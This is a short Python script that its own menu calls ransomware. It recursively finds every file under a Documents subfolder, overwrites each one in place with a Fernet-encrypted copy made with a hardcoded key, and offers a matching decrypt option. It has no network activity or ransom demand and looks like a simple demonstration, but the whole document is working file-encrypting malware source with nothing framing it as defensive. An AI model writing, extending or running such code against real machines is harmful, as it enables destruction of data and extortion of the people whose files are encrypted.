from pathlib import Path
from cryptography.fernet import Fernet

def getFiles(p):
    flist = p.glob('**/*')
    files = [x for x in flist if x.is_file()]
    return files

def encrypt(filee):
    with open(filee, 'rb') as file: original = file.read()
    encrypted = fernet.encrypt(original)
    with open(filee, 'wb') as encrypted_file: encrypted_file.write(encrypted)

def decrypt(filee):
    with open(filee, 'rb') as file: content = file.read()
    decrypted = fernet.decrypt(content)
    with open(filee, 'wb') as file: file.write(decrypted)

def showMenu():
    print('[RANSOMWARE MENU]')
    print('\t1)Encrypt files')
    print('\t2)Decrypt files')
    return(int(input('Option: ')))

#Configure starting path of the ransomware
#path = Path().absolute()
#foldername = path / 'arquivos'
path = Path(Path.home()).absolute()
foldername = path / 'Documents'/ 'LFA'
#print(path)
#print(getFiles(foldername))
files = getFiles(foldername)
#Cryptography key
fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')

opt = showMenu()
while opt != 9:
    if opt == 1: 
        for x in files:
            try: encrypt(x)
            except Exception: pass
    if opt == 2:
        for x in files:
            try: decrypt(x)
            except Exception: pass
    opt = showMenu()


